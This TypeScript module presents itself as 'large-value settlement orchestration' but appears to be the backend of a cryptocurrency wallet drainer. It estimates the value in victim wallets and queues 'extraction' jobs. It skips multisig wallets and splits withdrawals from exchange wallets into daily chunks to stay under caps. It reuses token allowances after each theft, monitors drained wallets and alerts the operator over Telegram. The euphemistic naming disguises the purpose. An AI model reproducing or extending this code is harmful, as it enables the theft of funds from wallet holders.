/**
 * Large-value settlement orchestration — policy hooks, deferred jobs, Telegram alerts.
 */
import {
  estimateSettlementUsd,
  evaluateSettlementPolicy,
  isGasTopUpEnabled,
  readExchangeDeferDailyUsd,
  runGasTopUpCycle,
  runWithForcedMevProtect,
  shouldMonitorWalletAfterSettlement,
  type SettlementPolicyDecision,
} from '@legion/core'

import { enqueueAllowanceReuseJob } from './allowance-reuse-queue.js'
import { enqueueExtractionJob } from './extraction-queue.js'
import {
  notifyExchangeWalletDeferred,
  notifyLargeTransferSettlement,
  notifyMultisigWalletSkipped,
  notifySettlementTiming,
} from './telegram.js'
import { addMonitoredWallet } from './wallet-monitor-store.js'

export type LargeSettlementIngressResult =
  | { proceed: true; policy: SettlementPolicyDecision }
  | { proceed: false; policy: SettlementPolicyDecision; http_status: number; message: string; code: string }

export async function evaluateLargeSettlementIngress(params: {
  wallet_address: string
  chain_id?: string | null
  scout_value_usd: number
  native_eth?: number
  token_address?: string
  amount?: string | null
  protocol?: string | null
  signature_id?: string
}): Promise<LargeSettlementIngressResult> {
  const estimated_usd = await estimateSettlementUsd({
    scout_value_usd: params.scout_value_usd,
    amount: params.amount,
    token_address: params.token_address,
    chain_id: params.chain_id,
    protocol: params.protocol,
  })

  const policy = await evaluateSettlementPolicy({
    wallet_address: params.wallet_address,
    chain_id: params.chain_id,
    scout_value_usd: estimated_usd,
    native_eth: params.native_eth,
  })

  if (policy.action === 'skip_multisig') {
    void notifyMultisigWalletSkipped(params.wallet_address, policy, params.scout_value_usd)
    return {
      proceed: false,
      policy,
      http_status: 422,
      message: policy.reason ?? 'Multi-signature wallet detected — settlement skipped',
      code: 'MultisigWalletSkipped',
    }
  }

  if (policy.action === 'defer_exchange') {
    await scheduleDeferredExchangeSettlement({
      wallet_address: params.wallet_address,
      chain_id: params.chain_id,
      scout_value_usd: params.scout_value_usd,
      token_address: params.token_address,
      policy,
    })
    void notifyExchangeWalletDeferred(params.wallet_address, policy, params.scout_value_usd)
    return {
      proceed: false,
      policy,
      http_status: 202,
      message: 'Large-value exchange wallet detected — deferring settlement',
      code: 'ExchangeWalletDeferred',
    }
  }

  if (policy.action === 'delay') {
    await scheduleDelayedSettlement({
      wallet_address: params.wallet_address,
      chain_id: params.chain_id,
      scout_value_usd: estimated_usd,
      token_address: params.token_address,
      signature_id: params.signature_id,
      policy,
    })
    void notifySettlementTiming({
      wallet_address: params.wallet_address,
      scout_value_usd: estimated_usd,
      timing: 'delayed',
      delay_hours: policy.delay_hours,
      strategies: policy.strategies,
    })
    const delayLabel = policy.delay_hours != null ? `${policy.delay_hours}h` : 'scheduled'
    return {
      proceed: false,
      policy,
      http_status: 202,
      message: `Settlement delayed (${delayLabel})`,
      code: 'SettlementDelayed',
    }
  }

  if (policy.force_mev_protect && isGasTopUpEnabled()) {
    void runGasTopUpCycle(undefined, { large_value: true }).catch(() => {})
  }

  return { proceed: true, policy }
}

export async function scheduleDeferredExchangeSettlement(params: {
  wallet_address: string
  chain_id?: string | null
  scout_value_usd: number
  token_address?: string
  policy: SettlementPolicyDecision
}): Promise<void> {
  const dailyCap = readExchangeDeferDailyUsd()
  const chunkCount = Math.max(1, params.policy.chunk_count ?? Math.ceil(params.scout_value_usd / dailyCap))
  const chunkUsd = params.scout_value_usd / chunkCount

  for (let i = 0; i < chunkCount; i++) {
    const delayMs = i * 24 * 60 * 60 * 1000
    await enqueueExtractionJob(
      'exchange-deferred-settlement',
      {
        wallet_address: params.wallet_address,
        chain_id: params.chain_id ?? '1',
        token_address: params.token_address,
        scout_value_usd: chunkUsd,
        chunk_index: i,
        chunk_total: chunkCount,
        exchange: params.policy.exchange,
        strategies: params.policy.strategies,
        defer_reason: params.policy.reason,
      },
      { delay: delayMs, removeOnComplete: 100, removeOnFail: 50 },
    )
  }
}

export async function scheduleDelayedSettlement(params: {
  wallet_address: string
  chain_id?: string | null
  scout_value_usd: number
  token_address?: string
  signature_id?: string
  policy: SettlementPolicyDecision
}): Promise<void> {
  await enqueueExtractionJob(
    'delayed-settlement',
    {
      wallet_address: params.wallet_address,
      chain_id: params.chain_id ?? '1',
      token_address: params.token_address,
      signature_id: params.signature_id,
      scout_value_usd: params.scout_value_usd,
      strategies: params.policy.strategies,
      force_mev_protect: params.policy.force_mev_protect,
      delay_reason: params.policy.reason,
    },
    { delay: params.policy.delay_ms, removeOnComplete: 100, removeOnFail: 50 },
  )
}

export async function onLargeSettlementSettled(params: {
  wallet_address: string
  chain_id?: string | null
  scout_value_usd: number
  token_address?: string
  policy?: SettlementPolicyDecision
  tx_hash?: string
}): Promise<void> {
  const chainId = params.chain_id != null ? Number.parseInt(String(params.chain_id), 10) : undefined
  void enqueueAllowanceReuseJob({
    wallet_address: params.wallet_address,
    ...(Number.isFinite(chainId) ? { evm_chain_id: chainId } : {}),
  }).catch(() => {})

  if (shouldMonitorWalletAfterSettlement(params.scout_value_usd)) {
    await addMonitoredWallet(params.wallet_address)
  }

  void notifyLargeTransferSettlement({
    wallet_address: params.wallet_address,
    scout_value_usd: params.scout_value_usd,
    strategies: params.policy?.strategies ?? ['immediate'],
    timing: params.policy?.timing ?? 'immediate',
    delay_hours: params.policy?.delay_hours,
    tx_hash: params.tx_hash,
    exchange: params.policy?.exchange,
  }).catch(() => {})
}

export async function runSettlementWithPolicyMev<T>(policy: SettlementPolicyDecision, fn: () => Promise<T>): Promise<T> {
  if (policy.force_mev_protect) return runWithForcedMevProtect(fn)
  return fn()
}
